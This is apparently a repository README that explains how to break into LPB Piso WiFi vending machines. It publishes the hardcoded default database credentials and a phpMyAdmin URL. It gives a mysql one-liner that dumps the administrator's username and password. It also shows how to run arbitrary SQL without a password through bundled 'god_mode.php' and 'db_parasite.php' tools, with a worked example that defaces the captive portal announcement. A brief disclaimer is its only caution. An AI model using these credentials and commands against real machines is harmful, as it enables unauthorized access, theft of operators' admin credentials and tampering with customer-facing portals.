# Database Blitz
This is the most interesting part in investigating the LPB Piso WiFi database. The database holds the setting configuration, customer's data; and even the most critical one, the administrator's password. If anyone can able to hack the SSH or login to phpMyAdmin, they can obtain the database password and then view the databases with these methods:
- (THIS IS FALSE) The passwords are stored either inside the encryption blob in the `lpbpisowifi.so`.

- inside `/etc/bluetooth/bluetooth/py/heartbeat.py` and `/etc/txt/` files, or scattered on all possible root directories if the devs changed it or;

- of course, from [phcorner](https://phcorner.org/threads/lv15-4-lpb-pisowifi-source-code-leak-encrypted-code.1828457/), if unchanged;

- or, we can execute a php backdoor to connect to MySQL without database password.

# Default Database Password
For accessing database through commandline `mysql` or webpage based phpMyAdmin (GUI), here is the default password:

<B>Username:</b> lpbpisowifi

<B>Password:</b> NkncqvS6vTkF1BTs

# phpMyAdmin
LPB Piso WiFi has a phpMyAdmin installed. You can login using the provided default username and password [here](http://10.0.0.1/phpMyAdmin-4.9.11-english). In this way, looking at the admin password is much easier than exploiting LPB or accessing SSH, because the database credentials is set to default and there is no way to change it from dashboard, unless the devs or experienced distributors changed it.

To see the admin's password, just navigate to `rpi_wifi` and select `my_users` at the left.

> phpMyAdmin is only available on version 15.5, confirmed not installed on 15.4 and 15.3 inside LPB directory, and only seen this on Orange Pi One board. Not confirmed on other older version or boards or x86 archs. I don't know why the devs installed or possible they'd forgot to remove it, as this alone is their biggest mistake. So if you can't reach phpMyAdmin, it means it uses old version or a small chance that they removed by the distributor or technicians.

# Harvest Administrator Password (From 10.0.0.1/admin)

> These information only applies to users who got SSH access to LPB.

To harvest admin password, execute:
```
mysql -u lpbpisowifi -pNkncqvS6vTkF1BTs -D rpi_wifi -e "SELECT username, password FROM my_users"
```
where `-pNkncqvS6vTkF1BTs` is the database password of `NkncqvS6vTkF1BTs`.

# Harvest and Edit Database (Without Password)
We can access the database even if you don't know the database password by hijacking connection to `/etc/bluetooth/bluetooth/vendor/mtdowling/cron-expression/src/Cron/conn.php`. I provided two php scripts under `/TOOLS` directory to view and edit database.

To view only the database, just execute:
```
php db_parasite.php
```

This just lists the most interesting datasets.

For the use of `god_mode.php`, this script is basic but the most powerful tool. So by using this, you should know the basic SQL statements (DQL, DML, DDL, DCL, etc.).

So the usage should be:
```
php god_mode.php "<SQL_QUERY>"
```

To know the list of databases, execute:
```
php god_mode.php "SHOW DATABASES" 
```

To see the database tables, execute: 
```
php god_mode.php "SHOW TABLES"
```

To see the structure of the database, like `my_settings`, execute:
```
php god_mode.php "DESCRIBE my_settings" 
```

Now to edit contents of the database, for this example you want to change portal announcement, execute this:
```
php god_mode.php "UPDATE my_settings SET portalannouncement='YOUR NEW ANNOUNCEMENT' WHERE recno=1"
```

# Screenshots:
![an image showing sql output](/IMAGES/sql1.png)This image shows the changed [`portalannouncement`]

![an image showing captive portal](/IMAGES/bitdeface.png)This image shows a captive portal, with modified Portal Announcement, without involvement of admin dashboard page.

# Screenrecord

This shows how to login to phpMyAdmin to access LPB Piso WiFi's database (only available for 15.5 img file).

https://github.com/user-attachments/assets/aae094dd-8a07-4216-996e-51a9c9257738



# Disclaimer
Be responsible. Do not use this to your neighbor's Piso WiFi machines.
